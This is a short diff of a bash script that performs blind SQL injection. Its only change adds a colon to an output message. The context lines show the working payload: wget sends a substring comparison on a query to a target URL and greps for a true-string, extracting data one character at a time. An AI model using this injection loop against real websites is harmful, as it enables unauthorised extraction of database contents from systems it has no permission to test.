@@ -85,7 +85,7 @@ do
     wget "$URL?id=1' and substring(($query),$nthchar,1)='$i' -q -0 - | grep "$truestring" &> /dev/null
     if [ "$?" == "0" ]
     then
-      echo Character number $nthchar found $i
+      echo Character number $nthchar found: $i
       export result+=$i
       break
     fi
